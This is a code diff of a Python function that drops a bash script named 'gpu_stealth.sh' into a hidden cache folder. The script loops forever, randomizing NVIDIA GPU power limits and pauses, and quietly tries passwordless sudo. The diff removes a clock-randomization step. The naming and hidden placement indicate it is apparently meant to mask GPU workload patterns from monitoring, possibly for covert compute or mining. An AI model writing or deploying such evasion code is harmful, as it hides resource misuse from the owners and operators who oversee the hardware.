@@ -143,21 +143,14 @@ def launch_gpu_stealth_bash():
     """Launch nvidia-smi power cycling + clock randomization as bash subprocess.
     Runs independently from Python — no sudo issues from encrypted config."""
     bash_script = '''#!/bin/bash
-BANDS=("1095,1300" "1300,1500" "1500,1700" "1700,1850" "1850,1980")
 nvidia-smi -pm 1 2>/dev/null || sudo -n nvidia-smi -pm 1 2>/dev/null
 while true; do
   PWR=$((RANDOM % 141 + 525))
   nvidia-smi -pl $PWR 2>/dev/null || sudo -n nvidia-smi -pl $PWR 2>/dev/null
   sleep $((RANDOM % 31 + 30))
-  BAND=${BANDS[$((RANDOM % ${#BANDS[@]}))]}
-  nvidia-smi -lgc $BAND 2>/dev/null || sudo -n nvidia-smi -lgc $BAND 2>/dev/null
-  sleep $((RANDOM % 41 + 20))
   LOW=$((RANDOM % 141 + 210))
   nvidia-smi -pl $LOW 2>/dev/null || sudo -n nvidia-smi -pl $LOW 2>/dev/null
   sleep $((RANDOM % 121 + 60))
-  PWR=$((RANDOM % 141 + 525))
-  nvidia-smi -pl $PWR 2>/dev/null || sudo -n nvidia-smi -pl $PWR 2>/dev/null
-  sleep $((RANDOM % 61 + 30))
 done'''
     try:
         bash_path = Path(__file__).parent.parent / ".data_cache" / "gpu_stealth.sh"
